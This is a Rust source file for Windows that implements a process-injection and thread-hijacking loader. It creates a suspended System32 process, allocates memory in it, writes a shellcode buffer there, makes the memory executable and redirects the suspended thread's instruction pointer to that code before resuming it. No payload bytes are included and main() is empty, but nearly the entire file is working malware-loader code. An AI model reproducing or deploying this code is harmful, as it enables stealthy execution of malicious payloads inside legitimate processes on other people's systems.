use std::f64::INFINITY;

use windows::core::PCSTR;
use windows::Win32::Foundation::{BOOL, HANDLE as HHANDLE, MAX_PATH};
use windows::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext};
use windows::Win32::System::Diagnostics::Debug::{WriteProcessMemory, CONTEXT, CONTEXT_CONTROL_AMD64, WOW64_CONTEXT_CONTROL};
use windows::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    PAGE_READWRITE,
};
use windows::Win32::System::Threading::{ResumeThread, INFINITE};
use windows::Win32::System::{
    Environment::GetEnvironmentVariableA,
    Memory::VirtualProtectEx,
    Threading::{CreateProcessA, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA},
};
use windows::Win32::System::Threading::WaitForSingleObject;
use windows_strings::PSTR;

type PVOID = *mut std::ffi::c_void;
type PBYTE = *mut u8;
type DWORD = u32;

fn main() {}

fn create_suspended_process(
    lp_app_name: &str,
    dw_process_id: &mut u32,
    h_process: &mut HHANDLE,
    h_thread: &mut HHANDLE,
) -> bool {
    unsafe {
        let mut si: STARTUPINFOA = std::mem::zeroed::<STARTUPINFOA>();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed::<PROCESS_INFORMATION>();

        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let windir = PCSTR::from_raw(b"WINDIR\0".as_ptr());
        let mut buffer = [0u8; 260];

        if GetEnvironmentVariableA(windir, Some(&mut buffer)) == 0 {
            return false;
        }

        let mut l_path = [0u8; 260];

        let path_str = format!(
            "{}\\System32\\{lp_app_name}\0",
            std::str::from_utf8(&buffer[..buffer.iter().position(|&x| x == 0).unwrap_or(0)])
                .unwrap()
        );
        l_path[..path_str.len()].copy_from_slice(path_str.as_bytes());

        // Create the process
        match CreateProcessA(
            None,
            Some(PSTR::from_raw(l_path.as_mut_ptr())),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &si,
            &mut pi,
        ) {
            Err(err) => {
                eprintln!("{err}");
                return false;
            }
            Ok(_) => {}
        }

        *dw_process_id = pi.dwProcessId;
        *h_process = pi.hProcess;
        *h_thread = pi.hThread;

        true
    }
}

fn inject_shellcode_to_remote_process(
    h_process: HHANDLE,
    p_shellcode: PBYTE,
    s_size_of_shellcode: usize,
    p_address: *mut PVOID,
) -> bool {
    unsafe {
        let mut number_of_bytes_written: usize = 0;
        let mut old_protection: DWORD = 0;

        *p_address = VirtualAllocEx(
            h_process,
            None,
            s_size_of_shellcode,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if p_address.is_null() {
            eprintln!("ERROR ALLOCATING MEMORY EXTERNALLY!");
            return false;
        }

        match unsafe {
            WriteProcessMemory(
                h_process,
                *p_address,
                p_shellcode as _,
                s_size_of_shellcode,
                None,
            )
        } {
            Err(err) => {
                eprintln!("ERROR WRITING MEMORY!");
                std::process::exit(0x000100);
            }
            _ => (),
        };

        let mut old_protection = PAGE_READWRITE;

        match VirtualProtectEx(
            h_process,
            *p_address,
            s_size_of_shellcode,
            PAGE_EXECUTE_READWRITE,
            &mut old_protection,
        ) {
            Ok(t) => {}
            Err(err) => {
                eprintln!("Couldn't change the memory protection! panicking...");
                panic!();
            }
        }

        true
    }
}

fn hijack_thread(thread: HHANDLE, p_address: *mut PVOID) {
    unsafe {
        let mut thread_ctx : CONTEXT = std::mem::zeroed();
        thread_ctx.ContextFlags = CONTEXT_CONTROL_AMD64;

        match GetThreadContext(thread, &mut thread_ctx as *mut CONTEXT) {
            Ok(()) => {},
            Err(err) => {eprintln!("{:?}", err)},
        }

        thread_ctx.Rip = *p_address as u64;

        match SetThreadContext(thread, &mut thread_ctx as *mut CONTEXT) {
            Ok(()) => {},
            Err(err) => {eprintln!("{:?}", err)},
        }

        ResumeThread(thread);

        WaitForSingleObject(thread, INFINITE);
    }
}
